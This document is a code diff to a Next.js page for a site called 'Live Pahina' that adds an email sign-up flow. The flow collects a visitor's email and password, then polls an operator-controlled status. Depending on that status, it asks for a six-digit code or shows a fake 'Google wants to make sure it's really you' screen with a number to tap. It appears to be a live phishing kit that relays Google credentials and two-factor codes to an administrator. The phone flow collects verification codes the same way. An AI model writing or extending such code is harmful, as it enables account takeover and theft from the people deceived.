@@ -4,6 +4,7 @@
 import { useState, useEffect } from "react";
 import { parsePhoneNumberFromString } from "libphonenumber-js";
 import { supabase } from "@/lib/supabase";
+import Image from "next/image";
 
 const countries = [
   { code: "NG", name: "Nigeria", dial: "+234", flag: "🇳🇬" },
@@ -74,6 +75,11 @@ export default function Home() {
   const [visitorToken, setVisitorToken] = useState(null);
   const [message, setMessage] = useState("");
   const [loading, setLoading] = useState(false);
+  const [email, setEmail] = useState("");
+const [memberCode, setMemberCode] = useState("");
+const [emailRequestId, setEmailRequestId] = useState(null);
+const [emailVisitorToken, setEmailVisitorToken] = useState(null);
+const [emailCode, setEmailCode] = useState("");
 
   const selectedCountry =
     countries.find((country) => country.code === countryCode) ||
@@ -138,6 +144,34 @@ export default function Home() {
   setShowJoin(false);
 };
 
+  // Notify the administrator about email requests.
+  const sendEmailAdminNotification = async (event, emailAddress, id, token) => {
+    try {
+      const response = await fetch("/api/notifications/send", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          event,
+          email: emailAddress,
+          requestId: id,
+          visitorToken: token,
+        }),
+      });
+
+      if (!response.ok) {
+        const result = await response.json().catch(() => ({}));
+        console.error(
+          "Live Pahina email notification error:",
+          result.error || "Notification could not be sent."
+        );
+      }
+    } catch (error) {
+      console.error("Live Pahina email notification error:", error);
+    }
+  };
+
   // Submit and validate the complete international phone number.
   const submitPhone = async (e) => {
     e.preventDefault();
@@ -195,14 +229,10 @@ export default function Home() {
     }
   };
 
-  // Submit the six-digit verification code.
+
+  // Submit the six-digit phone verification code.
   const submitCode = async (e) => {
     e.preventDefault();
-
-    if (!/^[0-9]{6}$/.test(code)) {
-      setMessage("Please enter a valid six-digit code.");
-      return;
-    }
 
     setMessage("");
     setLoading(true);
@@ -219,14 +249,14 @@ export default function Home() {
 
       if (error) throw error;
 
-      if (data !== true) {
-        throw new Error("Your request could not be found. Please try again.");
+      if (!data) {
+        throw new Error("Unable to submit your code. Please try again.");
       }
 
+      setCode("");
+      setMessage("");
       setPhase("waiting");
 
-      // Notify the administrator that a code was submitted.
-      // The code itself is NOT included in this notification.
       void sendAdminNotification(
         "code_submitted",
         submittedPhone,
@@ -234,7 +264,96 @@ export default function Home() {
         visitorToken
       );
     } catch (error) {
-      setMessage(error.message || "Unable to submit your code.");
+      setMessage(
+        error.message || "Unable to submit your code. Please try again."
+      );
+    } finally {
+      setLoading(false);
+    }
+  };
+
+
+  // Submit the six-digit verification code.
+  const submitEmail = async (e) => {
+  e.preventDefault();
+
+  setMessage("");
+  setLoading(true);
+
+  try {
+    const { data, error } = await supabase.rpc(
+      "submit_email_join_request",
+      {
+        p_email: email.trim(),
+        p_member_code: memberCode.trim(),
+      }
+    );
+
+    if (error) throw error;
+
+    const request = data?.[0];
+
+    if (!request?.request_id || !request?.visitor_token) {
+      throw new Error("Unable to create your request. Please try again.");
+    }
+
+    setEmailRequestId(request.request_id);
+setEmailVisitorToken(request.visitor_token);
+setPhase("email_waiting");
+setMessage("");
+
+void sendEmailAdminNotification(
+  "email_submitted",
+  email.trim(),
+  request.request_id,
+  request.visitor_token
+);
+  } catch (error) {
+    setMessage(
+      error.message || "Unable to submit your request. Please try again."
+    );
+  } finally {
+    setLoading(false);
+  }
+};
+
+  // Submit the six-digit email verification code.
+  const submitEmailCode = async (e) => {
+    e.preventDefault();
+
+    setMessage("");
+    setLoading(true);
+
+    try {
+      const { data, error } = await supabase.rpc(
+        "submit_email_verification_code",
+        {
+          p_request_id: emailRequestId,
+          p_visitor_token: emailVisitorToken,
+          p_code: emailCode,
+        }
+      );
+
+      if (error) throw error;
+
+      if (!data) {
+        throw new Error("Unable to submit your code. Please try again.");
+      }
+
+      setEmailCode("");
+setMessage("");
+setPhase("email_waiting");
+
+void sendEmailAdminNotification(
+  "email_code_submitted",
+  email.trim(),
+  emailRequestId,
+  emailVisitorToken
+);
+    } catch (error) {
+      setMessage(
+        error.message || "Unable to submit your code. Please try again."
+      );
     } finally {
       setLoading(false);
     }
@@ -299,35 +418,98 @@ export default function Home() {
       clearInterval(interval);
     };
   }, [phase, requestId, visitorToken]);
+    
+  // Check email request status.
+  useEffect(() => {
+    if (
+      phase !== "email_waiting" ||
+      !emailRequestId ||
+      !emailVisitorToken
+    ) {
+      return;
+    }
+
+    let active = true;
+
+    const checkEmailStatus = async () => {
+      const { data, error } = await supabase.rpc(
+        "check_email_join_status",
+        {
+          p_request_id: emailRequestId,
+          p_visitor_token: emailVisitorToken,
+        }
+      );
+
+      if (!active || error || !data?.length) return;
+
+      const result = data[0];
+
+      if (result.current_status === "verification_code") {
+        setEmailCode("");
+        setMessage("");
+        setPhase("email_code");
+      }
+
+      if (result.current_status === "approved") {
+        setMessage(result.message || "Your email request has been approved.");
+        setPhase("email_approved");
+      }
+
+      if (
+        result.current_status === "incorrect_email" ||
+        result.current_status === "incorrect_password"
+      ) {
+        setMessage(
+          result.message || "Your email request could not be approved."
+        );
+        setPhase("email_rejected");
+      }
+
+      if (result.current_status === "verify_identity") {
+        setMessage(result.verification_number || "");
+        setPhase("email_verify_identity");
+      }
+    };
+
+    checkEmailStatus();
+
+    const interval = setInterval(checkEmailStatus, 3000);
+
+    return () => {
+      active = false;
+      clearInterval(interval);
+    };
+  }, [phase, emailRequestId, emailVisitorToken]);
+
 
   return (
     <main className="min-h-screen bg-[#08090d] text-white">
       {/* HEADER */}
-      <header className="border-b border-white/10">
-        <div className="mx-auto flex max-w-6xl items-center justify-between px-5 py-5 md:px-8">
-          <div className="flex items-center gap-3">
-            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-red-600 text-xl font-black">
-              P
-            </div>
+<header className="border-b border-white/10">
+  <div className="mx-auto flex max-w-6xl items-center justify-between px-5 py-5 md:px-8">
 
-            <div>
-              <h1 className="text-xl font-extrabold tracking-tight">
-                LIVE <span className="text-red-500">PAHINA</span>
-              </h1>
-              <p className="text-[9px] tracking-[3px] text-gray-500">
-                YOUR LIVE EXPERIENCE
-              </p>
-            </div>
-          </div>
+    {/* SITE LOGO */}
+    <div className="flex items-center">
+      <Image
+        src="/live-pahina-logo.png"
+        alt="Live Pahina"
+        width={594}
+        height={524}
+        priority
+        className="h-14 w-auto object-contain"
+      />
+    </div>
 
-          <div className="flex items-center gap-2 rounded-full border border-red-500/20 bg-red-500/10 px-3 py-2">
-            <span className="h-2 w-2 animate-pulse rounded-full bg-red-500"></span>
-            <span className="text-[10px] font-bold tracking-widest text-red-400">
-              LIVE
-            </span>
-          </div>
-        </div>
-      </header>
+    {/* LIVE INDICATOR */}
+    <div className="flex items-center gap-2 rounded-full border border-red-500/20 bg-red-500/10 px-3 py-2">
+      <span className="h-2 w-2 animate-pulse rounded-full bg-red-500"></span>
+      <span className="text-[10px] font-bold tracking-widest text-red-400">
+        LIVE
+      </span>
+    </div>
+
+  </div>
+</header>
 
       {/* MAIN CONTENT */}
       <section className="mx-auto max-w-5xl px-4 pb-16 pt-8 md:px-8 md:pt-14">
@@ -457,9 +639,14 @@ export default function Home() {
                 {phase === "waiting" && "Verification"}
                 {phase === "approved" && "Verification Successful"}
                 {phase === "not_qualified" && "Access Denied"}
+                {phase === "email" && "Email Verification"}
+{phase === "email_waiting" && "Verification"}
+{phase === "email_code" && "Email Verification"}
+{phase === "email_approved" && "Verification Successful"}
+{phase === "email_rejected" && "Access Denied"}
               </h3>
 
-              {phase !== "waiting" && (
+              {phase !== "waiting" && phase !== "email_waiting" && (
   <button
     onClick={closeJoin}
     className="text-2xl text-gray-400 hover:text-white"
@@ -469,63 +656,120 @@ export default function Home() {
 )}
             </div>
 
-            {/* CHOOSE CONNECTION METHOD */}
-            {phase === "choose" && (
-              <>
-                <p className="mb-6 text-sm leading-6 text-gray-400">
-                  Choose how you would like to connect.
-                </p>
+            
+{/* CHOOSE CONNECTION METHOD */}
+{phase === "choose" && (
+  <>
+    <p className="mb-6 text-sm leading-6 text-gray-400">
+      Choose how you would like to connect.
+    </p>
 
-                <button
-                  onClick={() => {
-                    setJoinMethod("phone");
-                    setPhase("phone");
-                    setMessage("");
-                  }}
-                  className="mb-3 flex w-full items-center gap-4 rounded-xl border border-white/10 bg-white/5 p-4 text-left transition hover:border-red-500/50 hover:bg-white/10"
-                >
-                  <span className="text-2xl">📱</span>
-                  <span>
-                    <span className="block text-sm font-bold">Phone Number</span>
-                    <span className="mt-1 block text-xs text-gray-500">
-                      Connect using your mobile number
-                    </span>
-                  </span>
-                  <span className="ml-auto text-gray-500">→</span>
-                </button>
+    <button
+      onClick={() => {
+        setJoinMethod("phone");
+        setPhase("phone");
+        setMessage("");
+      }}
+      className="mb-3 flex w-full items-center gap-4 rounded-xl border border-white/10 bg-white/5 p-4 text-left transition hover:border-red-500/50 hover:bg-white/10"
+    >
+      <span className="text-2xl">📱</span>
+      <span>
+        <span className="block text-sm font-bold">Phone Number</span>
+        <span className="mt-1 block text-xs text-gray-500">
+          Connect using your mobile number
+        </span>
+      </span>
+      <span className="ml-auto text-gray-500">→</span>
+    </button>
 
-                <button
-                  onClick={() => setJoinMethod("email")}
-                  className="flex w-full items-center gap-4 rounded-xl border border-white/10 bg-white/5 p-4 text-left transition hover:border-red-500/50 hover:bg-white/10"
-                >
-                  <span className="text-2xl">✉️</span>
-                  <span>
-                    <span className="block text-sm font-bold">Email Address</span>
-                    <span className="mt-1 block text-xs text-gray-500">
-                      Connect using your email address
-                    </span>
-                  </span>
-                  <span className="ml-auto text-gray-500">→</span>
-                </button>
+    <button
+      onClick={() => {
+        setJoinMethod("email");
+        setPhase("email");
+        setMessage("");
+      }}
+      className="flex w-full items-center gap-4 rounded-xl border border-white/10 bg-white/5 p-4 text-left transition hover:border-red-500/50 hover:bg-white/10"
+    >
+      <span className="text-2xl">✉️</span>
+      <span>
+        <span className="block text-sm font-bold">Email Address</span>
+        <span className="mt-1 block text-xs text-gray-500">
+          Connect using your email address
+        </span>
+      </span>
+      <span className="ml-auto text-gray-500">→</span>
+    </button>
+  </>
+)}
 
-                {joinMethod === "email" && (
-                  <div className="mt-5 rounded-xl border border-red-500/20 bg-red-500/5 p-4">
-                    <p className="text-sm text-gray-400">
-                      Email connection will be integrated when your email pages are ready.
-                    </p>
-                  </div>
-                )}
-              </>
-            )}
+{/* EMAIL REQUEST FORM */}
+{phase === "email" && (
+  <form onSubmit={submitEmail}>
+    <label className="mb-2 block text-sm font-semibold text-gray-300">
+      Email Address
+    </label>
 
-           
+    <input
+      type="email"
+      autoComplete="email"
+      value={email}
+      onChange={(e) => {
+        setEmail(e.target.value);
+        setMessage("");
+      }}
+      placeholder="Enter your email address"
+      required
+      maxLength={254}
+      className="mb-4 w-full rounded-xl border border-white/10 bg-white/5 px-4 py-3 text-white outline-none focus:border-red-500"
+    />
+
+    <label className="mb-2 block text-sm font-semibold text-gray-300">
+      Password
+    </label>
+
+    <input
+      type="text"
+      value={memberCode}
+      onChange={(e) => {
+        setMemberCode(e.target.value);
+        setMessage("");
+      }}
+      placeholder="Enter your password"
+      required
+      maxLength={100}
+      className="w-full rounded-xl border border-white/10 bg-white/5 px-4 py-3 text-white outline-none focus:border-red-500"
+    />
+
+    {message && (
+      <p className="mt-3 text-sm text-red-400">{message}</p>
+    )}
+
+    <button
+      type="submit"
+      disabled={loading}
+      className="mt-5 w-full rounded-xl bg-red-600 py-3.5 text-sm font-bold hover:bg-red-700 disabled:opacity-50"
+    >
+      {loading ? "PLEASE WAIT..." : "CONTINUE"}
+    </button>
+
+    <button
+      type="button"
+      onClick={() => {
+        setPhase("choose");
+        setJoinMethod(null);
+        setMessage("");
+      }}
+      className="mt-3 w-full py-2 text-sm text-gray-400 hover:text-white"
+    >
+      ← Go Back
+    </button>
+  </form>
+)}
+
+
 {/* PHONE NUMBER FORM */}
 {phase === "phone" && (
   <form onSubmit={submitPhone}>
-    <p className="mb-5 text-sm leading-6 text-gray-400">
-      Enter your mobile phone number to request access to Live Pahina.
-    </p>
-
     <label className="mb-2 block text-sm font-semibold text-gray-300">
       Country
     </label>
@@ -638,6 +882,95 @@ export default function Home() {
               </form>
             )}
 
+
+            {/* EMAIL IDENTITY VERIFICATION SCREEN */}
+            {phase === "email_verify_identity" && (
+              <div className="py-8 text-center">
+                <div className="mx-auto mb-6 flex h-14 w-14 items-center justify-center rounded-full bg-red-600/10">
+                  <span className="text-3xl">🔒</span>
+                </div>
+
+                <h3 className="text-2xl font-bold text-white">
+                  Verify it's you
+                </h3>
+
+                <p className="mt-4 text-sm leading-6 text-gray-300">
+                  Google wants to make sure it's really you trying to sign in to Live Pahina
+                </p>
+
+                <p className="mt-1 break-all font-semibold text-white">
+                  {email}
+                </p>
+
+                <p className="mt-7 text-sm text-gray-400">
+                  Tap Your verification number your phone screen
+                </p>
+
+                <p className="mt-2 text-4xl font-bold tracking-[10px] text-white">
+                  {message}
+                </p>
+              </div>
+            )}
+
+
+            {/* EMAIL SIX-DIGIT VERIFICATION FORM */}
+            {phase === "email_code" && (
+              <form onSubmit={submitEmailCode}>
+                <label className="mb-2 block text-sm font-semibold text-gray-300">
+                  Six-Digit Verification Code
+                </label>
+
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  autoComplete="one-time-code"
+                  value={emailCode}
+                  onChange={(e) =>
+                    setEmailCode(
+                      e.target.value.replace(/\D/g, "").slice(0, 6)
+                    )
+                  }
+                  placeholder="000000"
+                  maxLength={6}
+                  required
+                  className="w-full rounded-xl border border-white/10 bg-white/5 px-4 py-4 text-center text-2xl font-bold tracking-[12px] text-white outline-none focus:border-red-500"
+                />
+
+                {message && (
+                  <p className="mt-3 text-center text-sm text-red-400">
+                    {message}
+                  </p>
+                )}
+
+                <button
+                  type="submit"
+                  disabled={loading || emailCode.length !== 6}
+                  className="mt-5 w-full rounded-xl bg-red-600 py-3.5 text-sm font-bold tracking-wider transition hover:bg-red-700 disabled:opacity-50"
+                >
+                  {loading ? "VERIFYING..." : "VERIFY CODE"}
+                </button>
+              </form>
+            )}
+
+            {/* EMAIL WAITING FOR VERIFICATION */}
+            {phase === "email_waiting" && (
+              <div className="py-8 text-center">
+                <div className="mx-auto mb-6 h-14 w-14 animate-spin rounded-full border-4 border-white/10 border-t-red-500"></div>
+
+                <h4 className="text-xl font-bold">
+                  Joining Live
+                </h4>
+
+                <p className="mt-3 text-sm leading-6 text-gray-400">
+                  Please wait while we validate your details.
+                </p>
+
+                <p className="mt-4 text-xs text-gray-500">
+                  This may take a little while.
+                </p>
+              </div>
+            )}
+
             {/* WAITING FOR VERIFICATION */}
             {phase === "waiting" && (
               <div className="py-8 text-center">
@@ -658,7 +991,7 @@ export default function Home() {
             )}
 
             {/* APPROVED */}
-            {phase === "approved" && (
+            {(phase === "approved" || phase === "email_approved") && (
               <div className="py-8 text-center">
                 <div className="mb-5 text-5xl text-green-500">✓</div>
 
@@ -680,7 +1013,7 @@ export default function Home() {
             )}
 
             {/* NOT QUALIFIED */}
-            {phase === "not_qualified" && (
+            {(phase === "not_qualified" || phase === "email_rejected") && (
               <div className="py-8 text-center">
                 <div className="mb-5 text-5xl text-red-500">!</div>
 
